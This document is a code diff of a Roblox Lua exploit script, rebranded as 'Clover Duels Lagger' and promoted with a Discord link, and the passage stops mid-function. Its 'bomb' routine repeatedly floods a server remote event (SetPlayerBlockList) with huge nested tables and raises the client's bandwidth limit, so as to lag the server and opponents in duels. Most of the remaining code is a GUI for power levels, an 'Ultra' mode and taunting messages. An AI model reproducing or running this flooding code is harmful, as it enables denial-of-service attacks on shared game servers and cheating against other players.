@@ -1,5 +1,6 @@
---// VIOLENCIA LAGGER - PURPLE UI
---// Entfernte Sterne, grÃ¶ÃŸere UI, lila Farben
+--[[discord.gg/rPBGzppDam tik tok dark_souc y clavero.vs
+    CLOVER DUELS LAGGER - CON MOTOR DE LAG BY CLOVER LAGGER
+]]--
 
 --// SERVICES
 local Players = game:GetService("Players")
@@ -8,50 +9,43 @@ local TweenService = game:GetService("TweenService")
 local CoreGui = game:GetService("CoreGui")
 local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
+local SoundService = game:GetService("SoundService")
 
 local player = Players.LocalPlayer
-local ConfigFile = "ViolenciaLaggerConfig.json"
+local ConfigFile = "CloverDuelsLaggerConfig.json"
 
--- âš™ï¸ PODER EXACTO: 23 - 32 - 70
+-- niveles de potencia puestos x clover lagger
 local NIVELES = {
-    Low     = { poder = 23 },
-    Mid     = { poder = 50 },
-    High    = { poder = 70 }
+    Low   = { poder = 23, texto = "SPEED RECOMMENDED 50-25" },
+    Mid   = { poder = 32, texto = "SPEED RECOMMENDED 45-23" },
+    High  = { poder = 70, texto = "SPEED RECOMMENDED 40-17" },
+    Ultra = { poder = 90, texto = "" }
 }
 
--- ðŸ”‘ TECLA PREDETERMINADA: M
-local keybind = Enum.KeyCode.M
-local listeningForInput = false
+-- colores gui
+local COLORES = {
+    Low   = Color3.fromRGB(255,255,255),
+    Mid   = Color3.fromRGB(255,255,255),
+    High  = Color3.fromRGB(255,255,255),
+    Ultra = Color3.fromRGB(255,255,255)
+}
+
 local laggerActive = false
 local lagThread = nil
 local nivelActual = "Low"
 local ventanaBloqueada = false
+local selectedBackground = ""
+local keyBind = "G"
+local waitingForKey = false
+local uiVisible = true
 
--- ðŸŽ¨ LILA/VIOLETT ESTILO
-local UI_CONFIG = {
-    MainBg       = Color3.fromRGB(0, 0, 0),
-    TitleColor   = Color3.fromRGB(255, 255, 255),
-    TextColor    = Color3.fromRGB(220, 200, 255),
-    ButtonInact  = Color3.fromRGB(60, 40, 80),
-    ButtonLow    = Color3.fromRGB(100, 200, 150),
-    ButtonMid    = Color3.fromRGB(200, 180, 255),
-    ButtonHigh   = Color3.fromRGB(255, 100, 200),
-    ToggleOff    = Color3.fromRGB(70, 50, 100),
-    ToggleOn     = Color3.fromRGB(200, 100, 255),
-    LockColor    = Color3.fromRGB(220, 200, 255),
-    UnlockColor  = Color3.fromRGB(180, 150, 220),
-    Font         = Enum.Font.GothamBlack,
-    BorderColor  = Color3.fromRGB(150, 100, 180),
-    GlowColor    = Color3.fromRGB(200, 0, 255),
-    SelectorBg   = Color3.fromRGB(80, 60, 120),
-    SelectorAct  = Color3.fromRGB(200, 100, 255),
-}
-
--- ðŸ’¾ CONFIG
+-- funcion pra guardar la config
 local function SaveConfig()
     local data = {
         Nivel = nivelActual,
-        Bloqueado = ventanaBloqueada
+        Bloqueado = ventanaBloqueada,
+        BackgroundId = selectedBackground,
+        KeyBind = keyBind
     }
     pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end)
 end
@@ -62,111 +56,132 @@ local function LoadConfig()
             local data = HttpService:JSONDecode(readfile(ConfigFile))
             nivelActual = data.Nivel or "Low"
             ventanaBloqueada = data.Bloqueado or false
+            selectedBackground = tostring(data.BackgroundId or "")
+            keyBind = tostring(data.KeyBind or "G")
         end)
     end
 end
 LoadConfig()
 
--- âš ï¸ LAG ENGINE
+-- motor de lag echo por clover lagger
 local function bomb(poder)
     local main, spam = {}, {{}}
     local z = spam[1]
     for i = 1, 25 do local t = {} table.insert(z, t) z = t end
     local max = math.min(12000, poder * 50)
     for i = 1, max do table.insert(main, spam) end
-    pcall(function() game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) end)
+    pcall(function() 
+        game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) 
+    end)
 end
 
--- ðŸ§© ELEMENTOS
-local toggleBall, toggleContainer, btnLow, btnMid, btnHigh, lockButton
-local titleLabel, textLagger, keybindButton, toggleClick, shadowLabel, shadowGradient
-
--- Funciones de actualizaciÃ³n
-local function actualizarBotonesNivel()
-    if nivelActual == "Low" then
-        btnLow.BackgroundColor3 = UI_CONFIG.ButtonLow
-        btnLow.TextColor3 = Color3.fromRGB(0, 0, 0)
-        btnLow.BorderSizePixel = 0
-    else
-        btnLow.BackgroundColor3 = UI_CONFIG.ButtonInact
-        btnLow.TextColor3 = Color3.fromRGB(220, 200, 255)
-        btnLow.BorderSizePixel = 1
-        btnLow.BorderColor3 = UI_CONFIG.BorderColor
-    end
-    if nivelActual == "Mid" then
-        btnMid.BackgroundColor3 = UI_CONFIG.ButtonMid
-        btnMid.TextColor3 = Color3.fromRGB(0, 0, 0)
-        btnMid.BorderSizePixel = 0
-    else
-        btnMid.BackgroundColor3 = UI_CONFIG.ButtonInact
-        btnMid.TextColor3 = Color3.fromRGB(220, 200, 255)
-        btnMid.BorderSizePixel = 1
-        btnMid.BorderColor3 = UI_CONFIG.BorderColor
-    end
-    if nivelActual == "High" then
-        btnHigh.BackgroundColor3 = UI_CONFIG.ButtonHigh
-        btnHigh.TextColor3 = Color3.fromRGB(255, 255, 255)
-        btnHigh.BorderSizePixel = 0
-    else
-        btnHigh.BackgroundColor3 = UI_CONFIG.ButtonInact
-        btnHigh.TextColor3 = Color3.fromRGB(220, 200, 255)
-        btnHigh.BorderSizePixel = 1
-        btnHigh.BorderColor3 = UI_CONFIG.BorderColor
+-- reiniciar el lag 
+local function restartLagWithPower(poder)
+    if laggerActive then
+        if lagThread then
+            task.cancel(lagThread)
+            lagThread = nil
+        end
+        lagThread = task.spawn(function()
+            while laggerActive do
+                pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
+                bomb(poder)
+                task.wait(0.18)
+            end
+        end)
     end
 end
+
+-- elementos de la UI
+local toggleButton, btnLow, btnMid, btnHigh, btnUltra
+local titleLabel, textLagger
+local infoLabel
+local mainFrame, hideShowButton, miniBarContainer, miniBottomToggleBtn, backgroundImage, separatorLine, colorThemeLabel, noneButton, backgroundPanel, btnLow_ref, btnMid_ref, btnHigh_ref, btnUltra_ref, keyLabel, keyButton, discordLabel
+
+local miniButtons = {}
 
 local function actualizarSwitch()
-    if toggleContainer then
-        toggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff
-    end
-    if toggleBall then
-        toggleBall.BackgroundColor3 = laggerActive and UI_CONFIG.ToggleOn or UI_CONFIG.ToggleOff
+    if toggleButton then
+        toggleButton.Text = laggerActive and "ACTIVE" or "INACTIVE"
         if laggerActive then
-            toggleBall.Position = UDim2.new(1, -26, 0.5, -12)
+            toggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
+            toggleButton.TextColor3 = Color3.fromRGB(0,0,0)
+            toggleButton.BorderSizePixel = 0
         else
-            toggleBall.Position = UDim2.new(0, 4, 0.5, -12)
+            toggleButton.BackgroundColor3 = Color3.fromRGB(0,0,0)
+            toggleButton.TextColor3 = Color3.fromRGB(255,255,255)
+            toggleButton.BorderSizePixel = 1
+            toggleButton.BorderColor3 = Color3.fromRGB(255,255,255)
         end
     end
-    if toggleClick then
-        toggleClick.Text = laggerActive and "ACTIVE" or "INACTIVE"
+    if miniBottomToggleBtn then
+        miniBottomToggleBtn.Text = laggerActive and "ACTIVE" or "INACTIVE"
         if laggerActive then
-            toggleClick.TextColor3 = Color3.fromRGB(0, 255, 0)
+            miniBottomToggleBtn.BackgroundColor3 = Color3.fromRGB(255,255,255)
+            miniBottomToggleBtn.TextColor3 = Color3.fromRGB(0,0,0)
+            miniBottomToggleBtn.BorderSizePixel = 0
         else
-            toggleClick.TextColor3 = Color3.fromRGB(255, 0, 0)
+            miniBottomToggleBtn.BackgroundColor3 = Color3.fromRGB(0,0,0)
+            miniBottomToggleBtn.TextColor3 = Color3.fromRGB(255,255,255)
+            miniBottomToggleBtn.BorderSizePixel = 1
+            miniBottomToggleBtn.BorderColor3 = Color3.fromRGB(255,255,255)
         end
     end
 end
 
-local function actualizarCandado()
-    lockButton.Text = ventanaBloqueada and "Lock" or "Unlock"
-    lockButton.TextColor3 = ventanaBloqueada and Color3.fromRGB(220, 200, 255) or Color3.fromRGB(180, 150, 220)
-end
-
-local function actualizarKeybindButton()
-    if keybindButton then
-        local display = keybind.Name
-        if display:match("Button") then
-            display = display:gsub("Button", "")
+local function actualizarBotonesNivel()
+    local buttons = {
+        {btnLow, "Low"},
+        {btnMid, "Mid"},
+        {btnHigh, "High"},
+        {btnUltra, "Ultra"},
+    }
+    for _, item in ipairs(buttons) do
+        local button, level = item[1], item[2]
+        local active = nivelActual == level
+        if button then
+            if active then
+                button.BackgroundColor3 = Color3.fromRGB(255,255,255)
+                button.TextColor3 = Color3.fromRGB(0,0,0)
+                button.BorderSizePixel = 0
+            else
+                button.BackgroundColor3 = Color3.fromRGB(0,0,0)
+                button.TextColor3 = Color3.fromRGB(255,255,255)
+                button.BorderSizePixel = 1
+                button.BorderColor3 = Color3.fromRGB(255,255,255)
+            end
         end
-        keybindButton.Text = "KEY: " .. display
+    end
+
+    -- Sincronizar tambien los botones del mini menu (cuando usas Hide)
+    for _, item in ipairs(miniButtons) do
+        local active = item.level == nivelActual
+        if item.btn then
+            if active then
+                item.btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
+                item.btn.TextColor3 = Color3.fromRGB(0,0,0)
+                item.btn.BorderSizePixel = 0
+            else
+                item.btn.BackgroundColor3 = Color3.fromRGB(0,0,0)
+                item.btn.TextColor3 = Color3.fromRGB(255,255,255)
+                item.btn.BorderSizePixel = 1
+                item.btn.BorderColor3 = Color3.fromRGB(255,255,255)
+            end
+        end
+    end
+
+    if infoLabel then
+        infoLabel.Text = ""
+        infoLabel.TextColor3 = Color3.fromRGB(255,255,255)
+    end
+    if laggerActive then
+        restartLagWithPower(NIVELES[nivelActual].poder)
     end
 end
 
 local function toggleLagger()
     laggerActive = not laggerActive
-    local targetPos = laggerActive and UDim2.new(1, -26, 0.5, -12) or UDim2.new(0, 4, 0.5, -12)
-    TweenService:Create(toggleBall, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-        Position = targetPos,
-        BackgroundColor3 = laggerActive and UI_CONFIG.ToggleOn or UI_CONFIG.ToggleOff
-    }):Play()
-
-    toggleClick.Text = laggerActive and "ACTIVE" or "INACTIVE"
-    if laggerActive then
-        toggleClick.TextColor3 = Color3.fromRGB(0, 255, 0)
-    else
-        toggleClick.TextColor3 = Color3.fromRGB(255, 0, 0)
-    end
-
+    actualizarSwitch()
     if laggerActive then
         if lagThread then task.cancel(lagThread) end
         lagThread = task.spawn(function()
@@ -181,216 +196,618 @@ local function toggleLagger()
     end
 end
 
--- ðŸ–¼ï¸ INTERFAZ
-if CoreGui:FindFirstChild("ViolenciaUI") then CoreGui.ViolenciaUI:Destroy() end
+-- crear pantalla gui
+if CoreGui:FindFirstChild("CloverDuelsLagger_UI") then CoreGui.CloverDuelsLagger_UI:Destroy() end
 
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "ViolenciaUI"
+screenGui.Name = "CloverDuelsLagger_UI"
 screenGui.Parent = CoreGui
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 screenGui.ResetOnSpawn = false
 
--- Panel
-local mainFrame = Instance.new("Frame")
+-- alertas del modo ultra (creado x clover lagger)
+local ultraAlertRunning = false
+
+local function showUltraAlerts()
+    if ultraAlertRunning then return end
+    ultraAlertRunning = true
+
+    local messages = {
+        "SI PIERDES ES PORQUE ERES MALO, NO LE TIRES LA CULPA A CLOVER LAGGER XD",
+        "IF YOU LOSE, IT'S BECAUSE YOU'RE BAD. CREATED BY CLOVER LAGGER XD"
+    }
+
+    local alertFrame = Instance.new("Frame")
+    alertFrame.Name = "UltraAlert"
+    alertFrame.Parent = screenGui
+    alertFrame.AnchorPoint = Vector2.new(0.5, 0)
+    alertFrame.Position = UDim2.new(0.5, 0, 0, -44)
+    alertFrame.Size = UDim2.new(0, 310, 0, 36)
+    alertFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+    alertFrame.BackgroundTransparency = 0.05
+    alertFrame.BorderSizePixel = 0
+    alertFrame.ZIndex = 300
+    Instance.new("UICorner", alertFrame).CornerRadius = UDim.new(0, 10)
+
+    local alertStroke = Instance.new("UIStroke")
+    alertStroke.Parent = alertFrame
+    alertStroke.Color = Color3.fromRGB(255,255,255)
+    alertStroke.Thickness = 2
+    alertStroke.Transparency = 0.05
+
+    local alertText = Instance.new("TextLabel")
+    alertText.Parent = alertFrame
+    alertText.BackgroundTransparency = 1
+    alertText.Position = UDim2.new(0, 10, 0, 5)
+    alertText.Size = UDim2.new(1, -20, 1, -10)
+    alertText.Font = Enum.Font.GothamBlack
+    alertText.TextColor3 = Color3.fromRGB(255,255,255)
+    alertText.TextStrokeColor3 = Color3.fromRGB(0,0,0)
+    alertText.TextStrokeTransparency = 0.35
+    alertText.TextScaled = false
+    alertText.TextSize = 9
+    alertText.TextWrapped = true
+    alertText.ZIndex = 301
+
+    local alertScale = Instance.new("UIScale")
+    alertScale.Parent = alertFrame
+    alertScale.Scale = 0.9
+
+    local slideIn = TweenService:Create(
+        alertFrame,
+        TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
+        {Position = UDim2.new(0.5, 0, 0, 8)}
+    )
+
+    local scaleIn = TweenService:Create(
+        alertScale,
+        TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
+        {Scale = 1}
+    )
+
+    alertText.Text = messages[1]
+    slideIn:Play()
+    scaleIn:Play()
+    slideIn.Completed:Wait()
+
+    task.wait(3)
+
+    local switchOut = TweenService:Create(
+        alertText,
+        TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
+        {TextTransparency = 1, TextStrokeTransparency = 1}
+    )
+    switchOut:Play()
+    switchOut.Completed:Wait()
+
+    alertText.Text = messages[2]
+
+    local switchIn = TweenService:Create(
+        alertText,
+        TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        {TextTransparency = 0, TextStrokeTransparency = 0.35}
+    )
+    switchIn:Play()
+
+    task.wait(3)
+
+    local slideOut = TweenService:Create(
+        alertFrame,
+        TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
+        {Position = UDim2.new(0.5, 0, 0, -44), BackgroundTransparency = 1}
+    )
+
+    local finalTextFade = TweenService:Create(
+        alertText,
+        TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
+        {TextTransparency = 1, TextStrokeTransparency = 1}
+    )
+
+    slideOut:Play()
+    finalTextFade:Play()
+    slideOut.Completed:Wait()
+
+    alertFrame:Destroy()
+    ultraAlertRunning = false
+end
+
+-- Panel principal
+mainFrame = Instance.new("Frame")
 mainFrame.Name = "MainFrame"
 mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 mainFrame.BackgroundTransparency = 0
 mainFrame.BorderSizePixel = 2
-mainFrame.BorderColor3 = Color3.fromRGB(200, 100, 255)
-mainFrame.Size = UDim2.new(0, 380, 0, 200)
-mainFrame.Position = UDim2.new(0.15, 0, 0.5, -100)
+mainFrame.BorderColor3 = Color3.fromRGB(255,255,255)
+mainFrame.Size = UDim2.new(0, 316, 0, 225)
+mainFrame.Position = UDim2.new(0, 4, 0, 6)
 mainFrame.Parent = screenGui
 mainFrame.ClipsDescendants = true
-Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)
+mainFrame.Visible = false
+Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 20)
 
--- ðŸŒŒ LILA GRADIENT
-local gradient = Instance.new("UIGradient", mainFrame)
-gradient.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 10, 60)),
-    ColorSequenceKeypoint.new(0.3, Color3.fromRGB(80, 20, 120)),
-    ColorSequenceKeypoint.new(0.6, Color3.fromRGB(140, 40, 180)),
-    ColorSequenceKeypoint.new(0.85, Color3.fromRGB(180, 80, 220)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(220, 130, 255))
-})
-gradient.Rotation = 90
+-- Boton Hide/Show
+hideShowButton = Instance.new("TextButton", mainFrame)
+hideShowButton.Name = "HideShowButton"
+hideShowButton.BackgroundColor3 = Color3.fromRGB(0,0,0)
+hideShowButton.BorderSizePixel = 1
+hideShowButton.BorderColor3 = Color3.fromRGB(255,255,255)
+hideShowButton.Position = UDim2.new(1, -64, 0, 15)
+hideShowButton.Size = UDim2.new(0, 50, 0, 24)
+hideShowButton.Font = Enum.Font.GothamBold
+hideShowButton.Text = "Hide"
+hideShowButton.TextColor3 = Color3.fromRGB(255,255,255)
+hideShowButton.TextSize = 11
+hideShowButton.AutoButtonColor = false
+hideShowButton.ZIndex = 10
+Instance.new("UICorner", hideShowButton).CornerRadius = UDim.new(0, 6)
 
--- TÃTULO "Violencia Lagger"
-titleLabel = Instance.new("TextLabel", mainFrame)
-titleLabel.BackgroundTransparency = 1
-titleLabel.Position = UDim2.new(0, 5, 0, 5)
-titleLabel.Size = UDim2.new(0, 200, 0, 40)
-titleLabel.Font = Enum.Font.GothamBlack
-titleLabel.Text = "Violencia Lagger"
-titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-titleLabel.TextSize = 24
-titleLabel.TextXAlignment = Enum.TextXAlignment.Left
-titleLabel.TextYAlignment = Enum.TextYAlignment.Center
-titleLabel.ZIndex = 3
-titleLabel.ClipsDescendants = false
+-- minimenu (orden corregido: Low, Mid, High, Ultra)
+miniBarContainer = Instance.new("Frame", mainFrame)
+miniBarContainer.Name = "MiniBarContainer"
+miniBarContainer.BackgroundTransparency = 1
+miniBarContainer.Position = UDim2.new(0, 25, 0, 48)
+miniBarContainer.Size = UDim2.new(1, -50, 0, 70)
+miniBarContainer.Visible = false
+miniBarContainer.ZIndex = 10
 
-shadowLabel = Instance.new("TextLabel", mainFrame)
-shadowLabel.BackgroundTransparency = 1
-shadowLabel.Position = UDim2.new(0, 5, 0, 5)
-shadowLabel.Size = UDim2.new(0, 200, 0, 40)
-shadowLabel.Font = Enum.Font.GothamBlack
-shadowLabel.Text = "Violencia Lagger"
-shadowLabel.TextSize = 24
-shadowLabel.TextXAlignment = Enum.TextXAlignment.Left
-shadowLabel.TextYAlignment = Enum.TextYAlignment.Center
-shadowLabel.ZIndex = 4
-shadowLabel.ClipsDescendants = true
-shadowLabel.TextTransparency = 0
-shadowLabel.TextColor3 = Color3.fromRGB(220, 180, 255)
+local miniRow = Instance.new("Frame", miniBarContainer)
+miniRow.Name = "MiniRow"
+miniRow.BackgroundTransparency = 1
+miniRow.Size = UDim2.new(1, 0, 0, 31)
+miniRow.Position = UDim2.new(0, 0, 0, 0)
 
-shadowGradient = Instance.new("UIGradient", shadowLabel)
-shadowGradient.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(220, 180, 255)),
-    ColorSequenceKeypoint.new(0.2, Color3.fromRGB(240, 210, 255)),
-    ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 240, 255)),
-    ColorSequenceKeypoint.new(0.6, Color3.fromRGB(240, 210, 255)),
-    ColorSequenceKeypoint.new(0.8, Color3.fromRGB(220, 180, 255)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 150, 240))
-})
-shadowGradient.Rotation = 0
+local miniRowLayout = Instance.new("UIListLayout", miniRow)
+miniRowLayout.FillDirection = Enum.FillDirection.Horizontal
+miniRowLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+miniRowLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+miniRowLayout.Padding = UDim.new(0, 8)
+miniRowLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+local miniLevels = {"Low", "Mid", "High", "Ultra"}
+for i, lvl in ipairs(miniLevels) do
+    local mb = Instance.new("TextButton", miniRow)
+    mb.Name = "Mini" .. lvl
+    mb.LayoutOrder = i
+    mb.Size = UDim2.new(0, 64, 0, 31)
+    mb.Font = Enum.Font.GothamBlack
+    mb.Text = string.upper(lvl)
+    mb.TextSize = 10
+    mb.AutoButtonColor = false
+    mb.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    mb.BorderSizePixel = 1
+    mb.BorderColor3 = Color3.fromRGB(255, 255, 255)
+    mb.ZIndex = 11
+    Instance.new("UICorner", mb).CornerRadius = UDim.new(0, 5)
+
+    mb.MouseButton1Click:Connect(function()
+        nivelActual = lvl
+        actualizarBotonesNivel()
+        SaveConfig()
+
+        if lvl == "Ultra" and not laggerActive then
+            laggerActive = true
+            actualizarSwitch()
+            if lagThread then task.cancel(lagThread) end
+            lagThread = task.spawn(function()
+                while laggerActive do
+                    pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
+                    bomb(NIVELES[nivelActual].poder)
+                    task.wait(0.18)
+                end
+            end)
+        elseif laggerActive then
+            restartLagWithPower(NIVELES[nivelActual].poder)
+        end
+    end)
+
+    table.insert(miniButtons, {btn = mb, level = lvl})
+end
+
+miniBottomToggleBtn = Instance.new("TextButton", miniBarContainer)
+miniBottomToggleBtn.Name = "MiniBottomToggleBtn"
+miniBottomToggleBtn.Size = UDim2.new(0, 134, 0, 28)
+miniBottomToggleBtn.Position = UDim2.new(0.5, -67, 0, 38)
+miniBottomToggleBtn.Font = Enum.Font.GothamBlack
+miniBottomToggleBtn.Text = "INACTIVE"
+miniBottomToggleBtn.TextSize = 13
+miniBottomToggleBtn.AutoButtonColor = false
+miniBottomToggleBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+miniBottomToggleBtn.BorderSizePixel = 1
+miniBottomToggleBtn.BorderColor3 = Color3.fromRGB(255, 255, 255)
+miniBottomToggleBtn.ZIndex = 11
+Instance.new("UICorner", miniBottomToggleBtn).CornerRadius = UDim.new(1, 0)
+
+miniBottomToggleBtn.MouseButton1Click:Connect(function()
+    toggleLagger()
+end)
+
+-- animacion de entrada
+local introFrame = Instance.new("Frame")
+introFrame.Name = "CryonIntro"
+introFrame.Parent = screenGui
+introFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+introFrame.BackgroundTransparency = 1
+introFrame.BorderSizePixel = 0
+introFrame.Size = UDim2.new(1, 0, 1, 0)
+introFrame.Position = UDim2.new(0, 0, 0, 0)
+introFrame.ZIndex = 100
+
+local introSound = Instance.new("Sound")
+introSound.Name = "CloverDuelsLaggerIntroSound"
+introSound.SoundId = "rbxassetid://76650356472656"
+introSound.Volume = 1
+introSound.Looped = false
+introSound.Parent = SoundService
 
 task.spawn(function()
-    while true do
-        for i = 0, 1, 0.006 do
-            shadowGradient.Offset = Vector2.new(i, 0)
-            task.wait(0.025)
-        end
+    local loadStarted = tick()
+    while not introSound.IsLoaded and tick() - loadStarted < 8 do
+        task.wait(0.05)
+    end
+    if not introSound.Parent then return end
+    pcall(function()
+        introSound.TimePosition = 3
+        introSound:Play()
+    end)
+    task.wait(20)
+    if introSound and introSound.Parent then
+        pcall(function() introSound:Stop() end)
+        introSound:Destroy()
     end
 end)
 
--- BOTONES KEY Y LOCK
-keybindButton = Instance.new("TextButton", mainFrame)
-keybindButton.BackgroundColor3 = Color3.fromRGB(60, 40, 80)
-keybindButton.BackgroundTransparency = 0.1
-keybindButton.Position = UDim2.new(1, -85, 0, 5)
-keybindButton.Size = UDim2.new(0, 40, 0, 18)
-keybindButton.Font = Enum.Font.GothamBlack
-keybindButton.Text = "KEY: M"
-keybindButton.TextColor3 = Color3.fromRGB(220, 200, 255)
-keybindButton.TextSize = 8
-keybindButton.AutoButtonColor = false
-keybindButton.ZIndex = 2
-Instance.new("UICorner", keybindButton).CornerRadius = UDim.new(0, 6)
-actualizarKeybindButton()
+local introText = Instance.new("TextLabel")
+introText.Name = "IntroText"
+introText.Parent = introFrame
+introText.BackgroundTransparency = 1
+introText.AnchorPoint = Vector2.new(0.5, 0.5)
+introText.Position = UDim2.new(0.5, 0, -0.22, 0)
+introText.Size = UDim2.new(0.9, 0, 0, 70)
+introText.Font = Enum.Font.GothamBlack
+introText.Text = "CLOVER LAGGER"
+introText.TextColor3 = Color3.fromRGB(255, 255, 255)
+introText.TextStrokeColor3 = Color3.fromRGB(0,0,0)
+introText.TextStrokeTransparency = 0.05
+introText.TextScaled = true
+introText.Rotation = -16
+introText.ZIndex = 102
 
-lockButton = Instance.new("TextButton", mainFrame)
-lockButton.BackgroundTransparency = 0
-lockButton.BackgroundColor3 = Color3.fromRGB(60, 40, 80)
-lockButton.BackgroundTransparency = 0.1
-lockButton.Position = UDim2.new(1, -40, 0, 5)
-lockButton.Size = UDim2.new(0, 35, 0, 18)
-lockButton.Font = Enum.Font.GothamBlack
-lockButton.TextSize = 8
-lockButton.TextColor3 = Color3.fromRGB(220, 200, 255)
-lockButton.AutoButtonColor = false
-lockButton.ZIndex = 2
-Instance.new("UICorner", lockButton).CornerRadius = UDim.new(0, 6)
-lockButton.MouseButton1Click:Connect(function()
-    ventanaBloqueada = not ventanaBloqueada
-    actualizarCandado()
-    SaveConfig()
+local introGradient = Instance.new("UIGradient")
+introGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
+    ColorSequenceKeypoint.new(0.45, Color3.fromRGB(255,255,255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(255,255,255))
+})
+introGradient.Rotation = 90
+introGradient.Parent = introText
+
+local introShadow = Instance.new("TextLabel")
+introShadow.Name = "IntroShadow"
+introShadow.Parent = introFrame
+introShadow.BackgroundTransparency = 1
+introShadow.AnchorPoint = Vector2.new(0.5, 0.5)
+introShadow.Position = UDim2.new(0.5, 4, -0.22, 4)
+introShadow.Size = UDim2.new(0.9, 0, 0, 70)
+introShadow.Font = Enum.Font.GothamBlack
+introShadow.Text = "CLOVER LAGGER"
+introShadow.TextColor3 = Color3.fromRGB(255,255,255)
+introShadow.TextTransparency = 0.35
+introShadow.TextStrokeTransparency = 1
+introShadow.TextScaled = true
+introShadow.Rotation = -16
+introShadow.ZIndex = 101
+
+local introScale = Instance.new("UIScale")
+introScale.Parent = introText
+introScale.Scale = 0.4
+
+local shadowScale = Instance.new("UIScale")
+shadowScale.Parent = introShadow
+shadowScale.Scale = 0.4
+
+local fallTween = TweenService:Create(
+    introText,
+    TweenInfo.new(0.75, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out),
+    {Position = UDim2.new(0.5, 0, 0.5, 0), Rotation = 0}
+)
+
+local shadowFallTween = TweenService:Create(
+    introShadow,
+    TweenInfo.new(0.75, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out),
+    {Position = UDim2.new(0.5, 4, 0.5, 4), Rotation = 0}
+)
+
+local scaleTween = TweenService:Create(
+    introScale,
+    TweenInfo.new(0.75, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
+    {Scale = 1}
+)
+
+local shadowScaleTween = TweenService:Create(
+    shadowScale,
+    TweenInfo.new(0.75, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
+    {Scale = 1}
+)
+
+fallTween:Play()
+shadowFallTween:Play()
+scaleTween:Play()
+shadowScaleTween:Play()
+
+task.spawn(function()
+    fallTween.Completed:Wait()
+
+    local pulseUp = TweenService:Create(introScale, TweenInfo.new(0.28, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Scale = 1.08})
+    local pulseDown = TweenService:Create(introScale, TweenInfo.new(0.28, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Scale = 1})
+    local pulseUpShadow = TweenService:Create(shadowScale, TweenInfo.new(0.28, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Scale = 1.08})
+    local pulseDownShadow = TweenService:Create(shadowScale, TweenInfo.new(0.28, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Scale = 1})
+    local floatUp = TweenService:Create(introText, TweenInfo.new(0.32, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, 0, 0.485, 0)})
+    local floatUpShadow = TweenService:Create(introShadow, TweenInfo.new(0.32, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, 4, 0.485, 4)})
+    local floatDown = TweenService:Create(introText, TweenInfo.new(0.32, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Position = UDim2.new(0.5, 0, 0.5, 0)})
+    local floatDownShadow = TweenService:Create(introShadow, TweenInfo.new(0.32, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Position = UDim2.new(0.5, 4, 0.5, 4)})
+
+    pulseUp:Play()
+    pulseUpShadow:Play()
+    floatUp:Play()
+    floatUpShadow:Play()
+    task.wait(0.32)
+    pulseDown:Play()
+    pulseDownShadow:Play()
+    floatDown:Play()
+    floatDownShadow:Play()
+
+    task.wait(1.15)
+
+    local fadeText = TweenService:Create(introText, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {TextTransparency = 1, TextStrokeTransparency = 1, Rotation = 4, Position = UDim2.new(0.5, 0, 0.42, 0)})
+    local fadeShadow = TweenService:Create(introShadow, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {TextTransparency = 1, Position = UDim2.new(0.5, 4, 0.42, 4)})
+    local shrinkText = TweenService:Create(introScale, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Scale = 0.88})
+    local shrinkShadow = TweenService:Create(shadowScale, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Scale = 0.88})
+
+    fadeText:Play()
+    fadeShadow:Play()
+    shrinkText:Play()
+    shrinkShadow:Play()
